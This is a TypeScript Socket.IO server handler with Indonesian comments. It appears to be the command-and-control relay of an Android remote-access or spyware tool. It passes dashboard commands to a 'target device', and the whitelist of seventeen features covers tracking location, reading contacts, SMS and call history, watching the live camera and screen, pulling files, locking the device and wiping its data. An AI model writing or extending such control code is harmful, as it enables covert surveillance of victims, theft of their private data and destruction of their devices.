import { Socket, Server } from 'socket.io';

/**
 * Admin Handler bertugas menangani semua komunikasi dari Dashboard Vercel.
 * Semua perintah 17 fitur akan dirutekan di sini.
 */
export const adminHandler = (io: Server, socket: Socket) => {
  const pin = socket.data.pin; // Mengambil PIN dari auth middleware
  
  if (!pin) {
    socket.emit('error', 'PIN tidak ditemukan dalam sesi.');
    return;
  }

  // Dashboard bergabung ke room yang dinamai berdasarkan PIN
  socket.join(pin);
  console.log(`Admin (Dashboard) terhubung ke Room PIN: ${pin}`);

  /**
   * Menerima perintah dari Dashboard dan meneruskannya ke Perangkat Target.
   * Format payload: { command: string, data?: any }
   */
  socket.on('admin_command', (payload: { command: string; data?: any }) => {
    const { command, data } = payload;
    
    console.log(`[${pin}] Admin mengirim perintah: ${command}`);

    // Validasi perintah (opsional: bisa dicek apakah command ada dalam daftar 17 fitur)
    const validCommands = [
      'lacak', 'notifikasi', 'device_gallery', 'daftar_kontak', 
      'riwayat_panggilan', 'live_camera', 'app_management', 'ganti_wallpaper', 
      'hidupkan_senter', 'kunci_layar', 'camera_monitoring', 'putar_video', 
      'file_target', 'pesan_sms', 'live_screen', 'device_lock_pro', 'reset_data'
    ];

    if (!validCommands.includes(command)) {
      socket.emit('command_error', `Perintah tidak dikenal: ${command}`);
      return;
    }

    // Mengirim perintah ke perangkat target spesifik di dalam room PIN yang sama
    // io.to(pin) memastikan perintah HANYA sampai ke perangkat dengan PIN tersebut
    io.to(pin).emit('device_command', {
      command,
      data: data || null,
      timestamp: Date.now()
    });
  });

  /**
   * Penanganan saat Dashboard meminta status perangkat
   */
  socket.on('request_status', () => {
    io.to(pin).emit('check_status', { timestamp: Date.now() });
  });

  /**
   * Pembersihan saat Dashboard terputus
   */
  socket.on('disconnect', () => {
    console.log(`Admin terputus dari room: ${pin}`);
  });
};
